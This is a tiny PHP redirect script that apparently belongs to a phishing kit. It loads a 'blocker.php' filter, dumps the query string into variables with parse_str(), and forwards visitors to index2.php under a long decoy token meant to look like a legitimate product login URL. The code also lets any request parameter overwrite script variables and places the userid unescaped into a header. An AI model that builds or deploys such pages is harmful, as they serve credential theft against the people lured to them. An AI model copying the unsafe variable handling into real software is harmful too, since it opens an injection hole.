<?php 
include('blocker.php');
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	header('Location: index2.php?l=_946f2cde0f344ac2567a45_j124456733ebe933255be_Product-UserID&userid='.$userid);
	
?>